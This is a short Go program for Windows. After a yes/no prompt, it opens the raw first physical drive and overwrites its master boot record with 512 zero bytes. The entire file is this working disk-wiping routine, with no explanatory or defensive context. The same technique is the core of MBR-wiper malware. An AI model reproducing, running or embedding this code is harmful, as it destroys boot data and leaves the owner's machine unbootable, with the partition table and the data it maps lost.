package main

import (
	"fmt"
	"os"
	"syscall"
)

func main() {

	fmt.Print("Are you sure you want to overwrite your MBR? (yes/no): ")
	var answer string
	fmt.Scanln(&answer)

	if answer == "yes" {

		// overwrite MBR
		err := overwriteMBR()
		if err != nil {
			fmt.Printf("Error overwriting MBR: %v\n", err)
			os.Exit(1)
		}

		fmt.Println("Your MBR is overwritten!")
	} else {
		fmt.Println("Abort.")
	}
}

func overwriteMBR() error {

	path, _ := syscall.UTF16PtrFromString(`\\.\PhysicalDrive0`)

	// open drive for writing
	handle, err := syscall.CreateFile(
		path,
		syscall.GENERIC_WRITE,
		syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,
		nil,
		syscall.OPEN_EXISTING,
		0,
		0)

	if err != nil {
		return err
	}
	defer syscall.CloseHandle(handle)

	// create a 512 byte buffer
	buffer := make([]byte, 512)

	// write buffer in MBR
	var bytesWritten uint32
	err = syscall.WriteFile(handle, buffer, &bytesWritten, nil)
	if err != nil {
		return err
	}

	return nil
}
